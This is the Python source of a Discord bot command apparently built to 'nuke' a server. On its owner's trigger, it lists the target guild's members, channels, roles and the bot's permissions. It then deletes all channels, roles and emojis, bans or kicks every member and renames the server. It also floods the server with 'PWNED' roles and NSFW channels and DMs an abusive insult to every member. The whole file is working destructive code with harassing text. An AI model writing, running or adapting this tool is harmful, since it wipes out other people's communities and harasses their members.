import chattrigger

import discord

import os

#import aiohttp

#from chattriggers.probeserver import ProbeServer

import traceback

import asyncio

class DestroyServer(chattrigger.ChatTrigger):
	
	async def run(self, message: discord.Message, trigger: str, client: discord.Client):
		ownerid = int(os.environ.get("OWNER_ID"))
		if not message.author.id == ownerid:
			return

		self.message = message
		
		self.targetguild = client.get_guild(int(message.content[len(trigger):]))

		await self.probeserver(self.targetguild, message)
		


		stage1modules = [self.channelpurge, self.rolepurge, self.memberpurge, self.emotepurge, self.servernamechange] # stage 1: burn the town

		stage2modules = [self.roleflood, self.channelflood, self.memberdmflood] # stage 2: salt the earth

		loop = asyncio.get_event_loop()

		await message.channel.send(f"Raining destruction on {str(self.targetguild)}")
		print(f"Raining destruction on {str(self.targetguild)}")

		for i in stage1modules:
			#loop.create_task(i())
			await i()
		
		for i in stage2modules:
			loop.create_task(i(self.targetguild))



		

		#stopstopstop
		

		#async with aiohttp.ClientSession() as session:
			#get = await session.get("https://i.imgur.com/fLgbLyq.jpg")
			#gottenbytes = await get.read()




		#try:
		 # XDXD
		

		
	async def channelpurge(self):
		counter = 0
		for i in self.targetguild.channels:
			try: 
				await i.delete()
				print(f"Successfully delete {i.name}")
				#await message.channel.send(f"Successfully delete {i.name}")
				counter += 1
			except: 
				print(f"Failed delete {i.name}")
				#await message.channel.send

		await self.message.channel.send(f"Successfully deleted {counter} channels.")

	async def memberpurge(self):
		
		counter = 0

		for i in self.targetguild.members:
			try: 
				await i.ban()
				print(f"Successfully banned {i.name}")
				#await message.channel.send
				counter += 1
			except: 
				print(f"Failed to ban {i.name}")
				try:
					await i.kick()
					counter += 1
				except:
					print(f"Failed to kick {i.name}")
					
				#await message.channel.send
		
		await self.message.channel.send(f"Successfully removed {counter} members.")

	async def rolepurge(self):
		
		counter = 0

		for i in self.targetguild.roles:
			try: 
				await i.delete()
				print(f"Successfully delete {i.name}")
				#await message.channel.send
				counter += 1
			except: print(f"Failed to delete {i.name}")
		
		await self.message.channel.send(f"Successfully deleted {counter} roles.")
	
	async def emotepurge(self):

		counter = 0

		for i in self.targetguild.emojis:
			try:
				await i.delete()
				print(f"Successfully deleted {i.name}")
				counter += 1
			except: print(f"Failed to delete {i.name}")

		await self.message.channel.send(f"Successfully deleted {counter} emotes.")

	async def servernamechange(self):

		await self.targetguild.edit(name = "。死", icon = None)

		await self.message.channel.send(f"Successfully renamed the server.")

	async def probeserver(self, targetserver: discord.Guild, message: discord.Message):
		targetserver: discord.Guild = targetserver

		messagestr = ""

		messagestr += f"**{targetserver.name}**\n"

		if targetserver.owner == None:
			messagestr += f"**Server has no owner!**\n"
		else:
			messagestr += f"**{str(targetserver.owner)} is owner.**\n"

		members = [str(x) for x in targetserver.members]
		membersstr = ", ".join(members)

		messagestr += f"**Members ({len(members)}):** "

		messagestr += f"{membersstr}\n"

		channels = [str(x) for x in targetserver.channels]
		channelsstr = ", ".join(channels)

		messagestr += f"**Channels ({len(channels)}):** "

		messagestr += f"{channelsstr}\n"

		roles = [str(x) for x in targetserver.roles]
		rolesstr = ", ".join(roles)

		messagestr += f"**Roles ({len(roles)}):** "

		messagestr += f"{rolesstr}\n"

		#

		selfroles = [str(x) for x in targetserver.me.roles]
		selfrolesstr = ", ".join(selfroles)

		messagestr += f"**Dot2 Roles ({len(selfroles)}):** "

		messagestr += f"{selfrolesstr}\n"

		selfpermissions = targetserver.me.guild_permissions

		messagestr += f"**Dot2 Permission Values:**\n"

		messagestr += f'''Administrator: {selfpermissions.administrator}
Manage Channels: {selfpermissions.manage_channels}
Manage Roles: {selfpermissions.manage_roles}
Manage Guild: {selfpermissions.manage_guild}
Ban Members: {selfpermissions.ban_members}
Kick Members: {selfpermissions.kick_members}'''

		#

		messagestr = discord.utils.escape_mentions(messagestr)

		#

		chunksize = 2000 # discord 2000 character limit

		#nofchunks = -(-len(messagestr) // chunksize) # ceiling division

		#chunks = []
		
		a = ""
		c = 0
		for i in messagestr: # discord 2000 character limit
			if c == chunksize:
				print(len(a))
				await message.channel.send(a)
				
				a = ""
				c = 0
			a += str(i)
			c += 1
		await message.channel.send(a)

	async def roleflood(self, targetserver: discord.Guild):

		colour = discord.Colour.from_rgb(0, 255, 0) # perfect green, lime green, a very eye piercing colour
		#permissions = discord.Permissions.all() # for the lulz

		#for i in range(10000):

		#flood roles up to limit

		print("starting role flood")
		await self.message.channel.send("starting role flood")

		while 1:
			try:
				#a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
				await targetserver.create_role(name = "PWNED", colour = colour, reason = "FUCK YOU LOLOLOL")
			except:
				print("Reached role limit!")
				#await a.delete()
				await self.message.channel.send("Reached role limit!")
				return

		#for i in range(6969): # jaja funny sex number
		#	a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
		#	await a.delete()
	
	async def channelflood(self, targetserver: discord.Guild):

		print("starting channel flood")
		await self.message.channel.send("starting channel flood")

		while 1:
			try:
				await targetserver.create_text_channel("P-W-N-E-D", position = 0, topic = "get fucked kid", slowmode_delay = 21600, nsfw = True, reason = "get fucked you bacon hair")
			except:
				print("Reached Chanenl Limit!")
				await self.message.channel.send("Reached channel limit!")
				return

	async def memberdmflood(self, targetserver: discord.Guild): # 2020-05-06

		print("starting dm flood")
		await self.message.channel.send("starting dm flood")
		d = 0
		for c, i in enumerate(targetserver.members, start = 1):
			try:
				dmc = await i.create_dm()

				await dmc.send("get fucked you bacon haired freak")

				d += 1
			except:
				#traceback.print_exc()
				pass
		
		await self.message.channel.send(f"sent {d}/{c} dms")
	

